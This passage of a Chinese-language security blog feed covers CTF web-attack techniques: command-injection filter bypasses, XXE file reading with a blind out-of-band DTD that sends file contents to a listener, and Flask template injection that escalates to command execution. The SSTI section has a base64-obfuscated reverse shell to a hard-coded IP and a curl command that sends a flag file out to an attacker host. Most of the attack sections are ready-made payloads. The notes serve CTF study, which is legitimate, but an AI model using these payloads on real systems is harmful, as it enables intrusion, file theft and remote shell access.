class="line">?ip&#x3D;127.0.0.1;cat$IFS$9&#96;ls&#96;</span><br></pre></td></tr></table></figure></li></ul><h3 id="0x-03-查看文件内容的常见命令"><a href="#0x-03-查看文件内容的常见命令" class="headerlink" title="0x 03 查看文件内容的常见命令"></a>0x 03 查看文件内容的常见命令</h3><p>参考这篇文章：<a href="https://blog.csdn.net/x7418520/article/details/81064861" target="_blank" rel="noopener">https://blog.csdn.net/x7418520/article/details/81064861</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cat     由第一行开始显示内容，并将所有内容输出</span><br><span class="line"></span><br><span class="line">tac     从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line"></span><br><span class="line">more    根据窗口大小，一页一页的现实文件内容</span><br><span class="line"></span><br><span class="line">less    和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line"></span><br><span class="line">head    只显示头几行</span><br><span class="line"></span><br><span class="line">tail    只显示最后几行</span><br><span class="line"></span><br><span class="line">nl      类似于cat -n，显示时输出行号</span><br><span class="line"></span><br><span class="line">tailf   类似于tail -f </span><br><span class="line">cut -b 1 flag      &#x2F;&#x2F;-b 可以逐位读取。</span><br><span class="line">a&#x3D;&#96;expr substr $PATH 1 1&#96;;b&#x3D;fla;c&#x3D;g.php;d&#x3D;ca;e&#x3D;t;$d$e ..$a$b$c;</span><br><span class="line">&#x2F;&#x2F; 利用环境变量来获取&#x2F;： expr substr $PATH 1 1 &#x3D;&gt;&#x2F;</span><br></pre></td></tr></table></figure><p>参考资料：</p><blockquote><p><a href="https://www.gem-love.com/ctf/1799.html" target="_blank" rel="noopener">https://www.gem-love.com/ctf/1799.html</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-命令联合执行&quot;&gt;&lt;a href=&quot;#0x-01-命令联合执行&quot; class=&quot;headerlink&quot; title=&quot;0x 01 命令联合执行&quot;&gt;&lt;/a&gt;0x 01 命令联合执行&lt;/h3&gt;&lt;p&gt;常用的命令分隔符：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;; &lt;/li&gt;
      
    
    </summary>
    
    
      <category term="tricks" scheme="http://yoursite.com/categories/tricks/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="命令执行tricks" scheme="http://yoursite.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Ctricks/"/>
    
  </entry>
  
  <entry>
    <title>xxe漏洞总结</title>
    <link href="http://yoursite.com/2020/04/07/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2020/04/07/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2020-04-07T07:25:13.000Z</published>
    <updated>2020-04-07T08:38:38.715Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-基础知识"><a href="#0x-01-基础知识" class="headerlink" title="0x 01 基础知识"></a>0x 01 基础知识</h3><p><strong>XML基础知识</strong></p><p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><h3 id="XML语法规则如下："><a href="#XML语法规则如下：" class="headerlink" title="XML语法规则如下："></a>XML语法规则如下：</h3><ol><li><strong>所有的XML元素都必须有一个关闭标签</strong></li><li><strong>XML标签对大小写敏感</strong></li><li><strong>XML必须正确嵌套</strong></li><li><strong>XML属性值必须加引号””</strong></li><li><strong>实体引用</strong>（在标签属性，以及对应的位置值可能会出现&lt;&gt;符号，但是这些符号在对应的XML中都是有特殊含义的，这时候我们必须使用对应html的实体对应的表示，比如&lt;傅好对应的实体就是lt，&gt;符号对应的实体就是gt）</li><li>在XML中，空格会被保留（案例如：<p>a空格B</p>，这时候a和B之间的空格就会被保留）</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;  &#x2F;&#x2F;xml声明</span><br><span class="line">&lt;!DOCTYPE copyright [        &#x2F;&#x2F;DTD(文档类型定义)</span><br><span class="line">&lt;!ELEMENT note (to,reset,login)&gt;   &#x2F;&#x2F;定义元素</span><br><span class="line">&lt;!ENTITY test SYSTEM &quot;url&quot;&gt;        &#x2F;&#x2F;定义外部实体test</span><br><span class="line">]&gt;</span><br><span class="line">&lt;to&gt;</span><br><span class="line">&lt;reset&gt;                    &#x2F;&#x2F;下面为文档元素</span><br><span class="line">  &lt;login&gt;&amp;test;&lt;&#x2F;login&gt;            &#x2F;&#x2F;调用test实体（此步骤不可缺）</span><br><span class="line">  &lt;secret&gt;login&lt;&#x2F;secret&gt;</span><br><span class="line">&lt;&#x2F;reset&gt;</span><br><span class="line">&lt;to&gt;</span><br></pre></td></tr></table></figure><p><strong>XML DTD介绍</strong></p><p>DTD文档类型定义，约束了xml文档的结构。拥有正确语法的XML被称为“形式良好”的XML，通过DTD验证约束XML是“合法”的XML。</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&#x2F;&#x2F;这一行是 XML 文档定义</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;</span><br><span class="line">&lt;!ELEMENT receiver (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT sender (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT header (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT msg (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><p>上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这么写</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;message&gt;</span><br><span class="line">&lt;receiver&gt;Myself&lt;&#x2F;receiver&gt;</span><br><span class="line">&lt;sender&gt;Someone&lt;&#x2F;sender&gt;</span><br><span class="line">&lt;header&gt;TheReminder&lt;&#x2F;header&gt;</span><br><span class="line">&lt;msg&gt;This is an amazing book&lt;&#x2F;msg&gt;</span><br><span class="line">&lt;&#x2F;message&gt;</span><br></pre></td></tr></table></figure><p>其实除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</span><br></pre></td></tr></table></figure><p>这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用），那么 XML 就可以写成这样</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;</span><br><span class="line">&lt;pass&gt;mypass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure><p>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</p><p><strong>DTD实体介绍</strong></p><ul><li><p>实体定义</p><p>实体是用于定义引用普通文本或者特殊字符的快捷方式的变量</p></li></ul><p>在DTD中的实体类型，一般分为：内部实体和外部实体，细分又分为一般实体和参数实体。除外部参数实体引用以字符（%）开始外，其它实体都以字符（&amp;）开始，以字符（;）结束。</p><p><strong>内部实体：</strong></p><p><img src="/2020/04/07/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/t01b0b455cabdadf651.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><p> <strong>外部实体：</strong></p><p><img src="/2020/04/07/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/t01a5b9284363aff87d.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&#x2F;URL&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>外部参数实体：</strong></p><p><img src="/2020/04/07/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/E:%5CHexo-Blog%5Csource_posts%5Cxxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%5Ct01755d18a3adf6383c.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名 &quot;实体内容”&gt;</span><br></pre></td></tr></table></figure><h3 id="0x-02-XML注入产生的原理"><a href="#0x-02-XML注入产生的原理" class="headerlink" title="0x 02 XML注入产生的原理"></a>0x 02 XML注入产生的原理</h3><p>​    XXE漏洞全称XML External Entity  Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p><h3 id="0x-03-常见攻击方法"><a href="#0x-03-常见攻击方法" class="headerlink" title="0x 03 常见攻击方法"></a>0x 03 常见攻击方法</h3><h4 id="3-1-有回显读本地敏感文件-Normal-XXE"><a href="#3-1-有回显读本地敏感文件-Normal-XXE" class="headerlink" title="3.1 有回显读本地敏感文件(Normal XXE)"></a>3.1 有回显读本地敏感文件(Normal XXE)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [  </span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;password&gt;admin&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure><p>注意：</p><blockquote><p>直接读取php文件会报错，因为php文件里面有&lt;&gt;//等特殊字符，xml解析时候会当成xml语法来解析。这时候就分不清处哪个是真正的xml语句了，</p><p>直接利用file协议读取PHP文件，就会产生报错，那么需要base64编码来读取</p></blockquote><h4 id="3-2-无回显读取本地敏感文件-Blind-OOB-XXE"><a href="#3-2-无回显读取本地敏感文件-Blind-OOB-XXE" class="headerlink" title="3.2 无回显读取本地敏感文件(Blind OOB XXE)"></a>3.2 无回显读取本地敏感文件(Blind OOB XXE)</h4><ul><li>攻击流程：<ol><li>客户端发送payload 1给web服务器</li><li>web服务器向vps获取恶意DTD，并执行文件读取payload2</li><li>web服务器带着回显结果访问VPS上特定的FTP或者HTTP</li><li>通过VPS获得回显（nc监听端口）</li></ol></li></ul><p>我们选择使用外部DTD，在主机上编写一个dtd文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM “PHP:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd”&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % all “&lt;!ENTITY send SYSTEM ‘监听的url+端口&#x2F;?file;’&gt;”&gt;</span><br><span class="line"></span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/07/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/t014afb0a837226463c.png" alt></p><p>Payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;”1.0” encoding&#x3D;”utf-8” ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DDOCTYPE root SYSTEM “dtd文件”&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;&amp;send;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/07/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/t0177676f0a5d14e921.png" alt></p><p>我们先声明一个外部的DTD引用，然后再xml文档内容中引用外部DTD中的一般实体。</p><h4 id="3-3-HTTP-内网主机探测"><a href="#3-3-HTTP-内网主机探测" class="headerlink" title="3.3 HTTP 内网主机探测"></a>3.3 HTTP 内网主机探测</h4><p>我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;proc&#x2F;net&#x2F;fib_trie  路由树</span><br><span class="line">&#x2F;etc&#x2F;hosts  linux系统中负责ip地址与域名快速解析的文件</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;arp  &#x2F;&#x2F;arp表，可以获得内网其他机器的地址</span><br></pre></td></tr></table></figure><p>利用http协议继续访问内网主机或者进行内网主机端口扫描</p><p>最后放一个payload集合：<a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/" target="_blank" rel="noopener">https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/</a></p><p>参考资料：</p><blockquote><p><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357</a></p><p><a href="https://www.anquanke.com/post/id/197423" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197423</a></p><p><a href="https://xz.aliyun.com/t/6887" target="_blank" rel="noopener">https://xz.aliyun.com/t/6887</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-基础知识&quot;&gt;&lt;a href=&quot;#0x-01-基础知识&quot; class=&quot;headerlink&quot; title=&quot;0x 01 基础知识&quot;&gt;&lt;/a&gt;0x 01 基础知识&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;XML基础知识&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;XML用于标
      
    
    </summary>
    
    
      <category term="web基础知识" scheme="http://yoursite.com/categories/web%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="xxe漏洞" scheme="http://yoursite.com/tags/xxe%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>flask模板注入总结</title>
    <link href="http://yoursite.com/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</id>
    <published>2020-04-05T15:34:51.000Z</published>
    <updated>2020-04-07T12:03:46.058Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-基础知识"><a href="#0x-01-基础知识" class="headerlink" title="0x 01 基础知识"></a>0x 01 基础知识</h3><blockquote><p>参考这篇文章：<a href="https://www.freebuf.com/column/187845.html" target="_blank" rel="noopener">从零学习flask模板注入</a></p></blockquote><p>漏洞原理：不正确的使用flask中的<code>render_template_string()</code>导致的<code>SSTI</code>，并且<strong>模板内容直接受用户控制</strong></p><p>注意：理论上不同机器、不同python版本的payload是不尽相同的。</p><p>测试代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from flask import *</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">def test():</span><br><span class="line">    code &#x3D; request.args.get(&#39;id&#39;)</span><br><span class="line">    html &#x3D; &#39;&#39;&#39;</span><br><span class="line">        &lt;h3&gt;%s&lt;&#x2F;h3&gt;</span><br><span class="line">    &#39;&#39;&#39;%(code)</span><br><span class="line">    return render_template_string(html)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.run(host&#x3D;&#39;0.0.0.0&#39;)</span><br></pre></td></tr></table></figure><p><strong>文件读取/命令执行</strong></p><p>无论是实现文件读取还是命令执行，需要利用对象的继承，先找到父类``，再寻找子类，最后找到我们需要用到的相应模块</p><p><strong>几个要用到的魔术方法</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line">&#x2F;&#x2F; __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure><h3 id="0x-02-Python2-环境下测试"><a href="#0x-02-Python2-环境下测试" class="headerlink" title="0x 02 Python2 环境下测试"></a>0x 02 Python2 环境下测试</h3><p>测试环境：2.7.12</p><p>①获取类对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__</span><br><span class="line">&lt;type &#39;str&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; request.__class__</span><br><span class="line">&lt;type &#39;module&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__</span><br><span class="line">&lt;type &#39;list&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__</span><br><span class="line">&lt;type &#39;tuple&#39;&gt;</span><br></pre></td></tr></table></figure><p>②寻找基类<code>object</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__</span><br><span class="line">(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;)</span><br><span class="line">&gt;&gt;&gt; requests.__class__.__mro__</span><br><span class="line">(&lt;type &#39;module&#39;&gt;, &lt;type &#39;object&#39;&gt;)</span><br><span class="line">&gt;&gt;&gt; [].__class__.__mro__</span><br><span class="line">(&lt;type &#39;list&#39;&gt;, &lt;type &#39;object&#39;&gt;)</span><br><span class="line">&gt;&gt;&gt; ().__class__.__mro__</span><br><span class="line">(&lt;type &#39;tuple&#39;&gt;, &lt;type &#39;object&#39;&gt;)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;request.__class__.__mro__[8]</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__</span><br><span class="line">&lt;type &#39;object&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__.__base__</span><br><span class="line">&lt;type &#39;object&#39;&gt;</span><br></pre></td></tr></table></figure><blockquote><p>object在最底层故在列表中的最后，通过<code>__mro__[-1]</code>可以获取到</p></blockquote><p>③寻找可用的引用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2].__subclasses__()</span><br><span class="line">[&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, 等等</span><br></pre></td></tr></table></figure><p>④尝试文件读取</p><p><strong>payload</strong></p><p>发现40的地方存在 <code>&lt;type &#39;file&#39;&gt;</code>，使用file方法可以读取文件:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br><span class="line">requests.__class__.__mro__[1].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br></pre></td></tr></table></figure><p><img src="/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200405233521992.png" alt></p><p><strong>Payload 2 利用&lt;class ‘warnings.catch_warnings’&gt;</strong></p><p>’catch_warnings’可以进一步构造来执行命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()   </span><br><span class="line"></span><br><span class="line"># 引用__builtins__和file模块</span><br></pre></td></tr></table></figure><p>⑤命令执行</p><p>寻找包含<code>os</code>模块的脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line">num &#x3D; 0</span><br><span class="line">for item in &#39;&#39;.__class__.__mro__[-1].__subclasses__():</span><br><span class="line">    try:</span><br><span class="line">         if &#39;os&#39; in item.__init__.__globals__:</span><br><span class="line">             print num,item</span><br><span class="line">         num+&#x3D;1</span><br><span class="line">    except:</span><br><span class="line">        print &#39;-&#39;</span><br><span class="line">        num+&#x3D;1</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">71 &lt;class &#39;site._Printer&#39;&gt;</span><br><span class="line">76 &lt;class &#39;site.Quitter&#39;&gt;</span><br></pre></td></tr></table></figure><p>前面已经找到了包含<code>os</code>模块的类，先初始化，再引用即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure><p><img src="/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200405235926575.png" alt></p><p>这里命令执行没有回显，用popen函数带出结果或者通过反弹shell和利用<code>curl</code>带出</p><p>改造后的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()</span><br></pre></td></tr></table></figure><p>反弹shell方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTcuNzguMS4yMDQvMTIzNCAwPiYxCg&#x3D;&#x3D;|base64 -d|bash&#39;)</span><br></pre></td></tr></table></figure><p>curl带出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;data&#x3D;$(cat &#x2F;fffffflag | base64);curl http:&#x2F;&#x2F;x.x.x.x&#x2F;?data&#x3D;$data;&#39;)</span><br></pre></td></tr></table></figure><ul><li>扩展使用</li></ul><p>已知函数名可获取函数信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def fun(x&#x3D;1):</span><br><span class="line">    # nothing here</span><br><span class="line">    a&#x3D;x*2</span><br><span class="line">    flag&#x3D;&#39;neko&#39;</span><br><span class="line">    return a</span><br><span class="line">print fun.func_code.co_consts</span><br><span class="line">print fun.func_globals</span><br><span class="line"></span><br><span class="line">&#x3D;&gt;</span><br><span class="line">(None, 2, &#39;neko&#39;)</span><br><span class="line">&#123;&#39;__builtins__&#39;: &lt;module &#39;__builtin__&#39; (built-in)&gt;, &#39;__file__&#39;: &#39;b.py&#39;, &#39;__package__&#39;: None, &#39;fun&#39;: &lt;function fun at 0x7f1b9317e750&gt;, &#39;__name__&#39;: &#39;__main__&#39;, &#39;__doc__&#39;: None&#125;</span><br></pre></td></tr></table></figure><p>可构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 无回显</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&quot;linecache&quot;].__dict__[&#39;os&#39;].__dict__[&#39;system&#39;](&#39;ls&#39;) </span><br><span class="line"></span><br><span class="line"># 带回显</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;ls&#39;).read()</span><br></pre></td></tr></table></figure><p>一般payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;o&quot;+&quot;s&quot;).__getattribute__(&#39;sys&#39;+&#39;tem&#39;)(&quot;l&quot;+&quot;s&quot;)</span><br><span class="line"></span><br><span 